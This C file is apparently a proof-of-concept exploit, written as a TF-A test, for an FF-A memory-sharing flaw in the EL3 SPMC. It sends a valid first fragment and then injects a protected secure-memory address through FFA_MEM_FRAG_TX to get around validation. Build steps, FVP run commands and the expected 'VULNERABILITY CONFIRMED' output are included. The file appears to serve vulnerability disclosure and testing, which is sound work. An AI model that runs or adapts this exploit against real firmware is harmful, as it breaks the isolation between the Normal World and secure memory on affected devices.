/*
 * PoC 1: FF-A Memory Sharing - Missing Validation in FFA_MEM_FRAG_TX
 *
 * Vulnerability: spmc_shmem_check_obj() in spmc_shared_mem.c line 972
 *   issues WARN without returning FFA_ERROR_INVALID_PARAMETER when a
 *   constituent address is not 4K-aligned or points to a protected region.
 *
 * Attack vector:
 *   The SPMC validates the address in the FIRST fragment (FFA_MEM_SHARE),
 *   but does NOT re-validate addresses in subsequent fragments sent via
 *   FFA_MEM_FRAG_TX. This allows the Normal World to inject protected
 *   memory addresses into the second fragment, bypassing validation.
 *
 * Root cause:
 *   File: services/std_svc/spm/el3_spmc/spmc_shared_mem.c
 *   Line: 972
 *   Code:
 *     if (!is_aligned(mrd->address, PAGE_SIZE)) {
 *         WARN("...not 4K aligned...");
 *         // MISSING: return FFA_ERROR_INVALID_PARAMETER;
 *     }
 *
 * Platform: FVP_Base_RevC-2xAEMvA (emulated)
 * TF-A version: v2.15.0
 * Branch: main (v2.15.0-328-g2021bc37e)
 *
 * Build instructions:
 *   Place this file in:
 *     tf-a-tests/tftf/tests/runtime_services/secure_service/poc1/poc1_frag_tx_bypass.c
 *
 *   Add to tests-poc1.mk:
 *     TESTS_SOURCES += $(addprefix tftf/tests/runtime_services/secure_service/, \
 *         ffa_helpers.c spm_common.c spm_test_helpers.c \
 *         aarch64/ffa_arch_helpers.S poc1/poc1_frag_tx_bypass.c)
 *
 *   Add tests-poc1.xml with test function: test_poc1_frag_tx_bypass
 *
 *   Build TFTF:
 *     make CROSS_COMPILE=aarch64-none-elf- PLAT=fvp DEBUG=1 \
 *          TESTS=poc1 all
 *
 *   Build TF-A (TSP as BL32, SPMC at EL3):
 *     # Step 1: Build TSP with SPMC_AT_EL3 and dynamic xlat
 *     make CROSS_COMPILE=aarch64-none-elf- PLAT=fvp DEBUG=1 \
 *          SPMC_AT_EL3=1 BL32_CPPFLAGS=-DPLAT_XLAT_TABLES_DYNAMIC \
 *          bl32
 *
 *     # Step 2: Build full TF-A with FIP
 *     make CROSS_COMPILE=aarch64-none-elf- PLAT=fvp DEBUG=1 \
 *          SPD=spmd SPMD_SPM_AT_SEL2=0 SPMC_AT_EL3=1 \
 *          ARM_SPMC_MANIFEST_DTS=plat/arm/board/fvp/fdts/fvp_tsp_sp_manifest.dts \
 *          BL32=<path>/bl32.bin BL33=<path>/tftf.bin \
 *          all fip
 *
 *   Run on FVP:
 *     FVP_Base_RevC-2xAEMvA \
 *       -C bp.secure_memory=1 \
 *       -C bp.secureflashloader.fname=bl1.bin \
 *       -C bp.flashloader0.fname=fip.bin
 *
 * Expected output:
 *   [poc1] VULNERABILITY CONFIRMED: SPMC accepted protected address in second fragment!
 *   [poc1] Handle: 0xffffffc0
 */

#include <arch_features.h>
#include <arch_helpers.h>
#include <runtime_services/ffa_helpers.h>
#include "ffa_svc.h"
#include "stdint.h"
#include "utils_def.h"
#include <debug.h>
#include <sync.h>

#include <ffa_endpoints.h>
#include <spm_common.h>
#include <spm_test_helpers.h>
#include <test_helpers.h>
#include <tftf_lib.h>
#include <xlat_tables_defs.h>
#include <stdio.h>
#include <stddef.h>
#include <string.h>

#define MAILBOX_SIZE        PAGE_SIZE
#define SENDER              HYP_ID
#define RECEIVER            SP_ID(1)

/*
 * Protected memory regions used as injection targets.
 * None of these should be accepted by the SPMC in a memory sharing
 * descriptor from the Normal World.
 */
#define TARGET_SECURE_TZC   0xFF000000ULL  /* ARM_AP_TZC_DRAM1_BASE (TSP region) */
#define TARGET_SPMC_BASE    0x06000000ULL  /* PLAT_ARM_TRUSTED_DRAM_BASE (SPMC)  */
#define TARGET_GIC          0x2F000000ULL  /* BASE_GICD_BASE (GIC Distributor)   */
#define NS_DRAM_VALID       0x88000000ULL  /* Valid NS-DRAM address (first frag) */

test_result_t test_poc1_frag_tx_bypass(void)
{
    printf("[poc1] TF-A FF-A SPMC - Missing validation in FFA_MEM_FRAG_TX\n");
    printf("[poc1] CVE candidate: spmc_shared_mem.c:972 WARN without return\n\n");

    /* Step 0: Negotiate FF-A version */
    struct ffa_value ver = ffa_version(FFA_VERSION_COMPILED);
    if (ver.fid == FFA_ERROR) {
        printf("[poc1] ffa_version() failed\n");
        return TEST_RESULT_FAIL;
    }
    printf("[poc1] FF-A version negotiated: 0x%lx\n", (unsigned long)ver.fid);

    struct mailbox_buffers mb;
    GET_TFTF_MAILBOX(mb);

    /*
     * Build a memory region descriptor with TWO constituents:
     *   [0] NS_DRAM_VALID  - aligned, NS, passes initial SPMC validation
     *   [1] TARGET_SECURE_TZC - protected region, sent in SECOND fragment
     *
     * By setting total_length > fragment_length, the SPMC enters fragmented
     * mode and requests the second fragment via FFA_MEM_FRAG_RX.
     */
    struct ffa_memory_region_constituent constituents[2] = {
        {
            .address    = (void *)NS_DRAM_VALID,
            .page_count = 1,
            .reserved   = 0,
        },
        {
            .address    = (void *)TARGET_SECURE_TZC,
            .page_count = 1,
            .reserved   = 0,
        },
    };

    struct ffa_memory_access receiver = ffa_memory_access_init(
        RECEIVER,
        FFA_DATA_ACCESS_RW,
        FFA_INSTRUCTION_ACCESS_NX,
        0,
        NULL);

    uint32_t total_length, fragment_length;

    ffa_memory_region_init(
        mb.send, MAILBOX_SIZE,
        SENDER, &receiver, 1,
        constituents, 2,
        0, 0,
        FFA_MEMORY_NORMAL_MEM,
        FFA_MEMORY_CACHE_WRITE_BACK,
        FFA_MEMORY_INNER_SHAREABLE,
        &total_length, &fragment_length);

    /*
     * Force fragmentation: set fragment_length to cover only the first
     * constituent. The SPMC will validate the first constituent (aligned,
     * NS) and accept it, then request the second via FFA_MEM_FRAG_RX.
     */
    if (fragment_length == total_length) {
        struct ffa_memory_region *r = (struct ffa_memory_region *)mb.send;
        struct ffa_memory_access *rcv = &r->receivers[0];
        struct ffa_composite_memory_region *comp =
            (struct ffa_composite_memory_region *)
            ((uint8_t *)r + rcv->composite_memory_region_offset);
        fragment_length =
            (uint8_t *)&comp->constituents[1] - (uint8_t *)r;
    }

    printf("[poc1] Step 1: FFA_MEM_SHARE (total=%u, frag=%u)\n",
           total_length, fragment_length);
    printf("[poc1]   First constituent:  0x%llx (NS-DRAM, valid)\n",
           NS_DRAM_VALID);

    struct ffa_value ret = ffa_mem_share(total_length, fragment_length);

    if (ret.fid != FFA_MEM_FRAG_RX) {
        if (ret.fid == FFA_ERROR) {
            printf("[poc1] SPMC rejected initial share (expected): %ld\n",
                   (long)ret.arg2);
        } else {
            printf("[poc1] Unexpected response: fid=0x%lx\n",
                   (unsigned long)ret.fid);
        }
        return TEST_RESULT_FAIL;
    }

    ffa_memory_handle_t handle = ffa_frag_handle(ret);
    printf("[poc1] First fragment accepted. Handle: 0x%llx\n",
           (unsigned long long)handle);

    /*
     * Step 2: Inject protected address in the SECOND fragment.
     *
     * The SPMC has validated the first constituent and is now waiting
     * for the second constituent via FFA_MEM_FRAG_TX. We inject the
     * protected address directly into the mailbox TX buffer before
     * calling FFA_MEM_FRAG_TX.
     *
     * Due to the missing return after WARN in spmc_shmem_check_obj():
     *   if (!is_aligned(mrd->address, PAGE_SIZE)) {
     *       WARN("...not 4K aligned...");
     *       // return FFA_ERROR_INVALID_PARAMETER;  <-- MISSING
     *   }
     * The SPMC accepts the second fragment without rejecting the
     * protected address.
     */
    struct ffa_memory_region_constituent *frag2 =
        (struct ffa_memory_region_constituent *)mb.send;

    frag2[0].address    = (void *)TARGET_SECURE_TZC;
    frag2[0].page_count = 1;
    frag2[0].reserved   = 0;

    uint32_t frag2_length = sizeof(struct ffa_memory_region_constituent);

    printf("[poc1] Step 2: FFA_MEM_FRAG_TX with protected address 0x%llx\n",
           TARGET_SECURE_TZC);

    ret = ffa_mem_frag_tx(handle, frag2_length);

    if (ret.fid == FFA_ERROR) {
        printf("[poc1] SPMC correctly rejected protected address (Safe): %ld\n",
               (long)ret.arg2);
        return TEST_RESULT_SUCCESS;
    } else if (ret.fid == FFA_SUCCESS_SMC64 || ret.fid == FFA_SUCCESS_SMC32) {
        printf("[poc1] VULNERABILITY CONFIRMED:\n");
        printf("[poc1]   SPMC accepted protected address 0x%llx in second fragment!\n",
               TARGET_SECURE_TZC);
        printf("[poc1]   Handle: 0x%llx\n",
               (unsigned long long)ffa_mem_success_handle(ret));
        printf("[poc1]   Root cause: spmc_shared_mem.c:972 WARN without return\n");
        return TEST_RESULT_FAIL;
    }

    printf("[poc1] Unexpected response: fid=0x%lx\n",
           (unsigned long)ret.fid);
    return TEST_RESULT_FAIL;
}
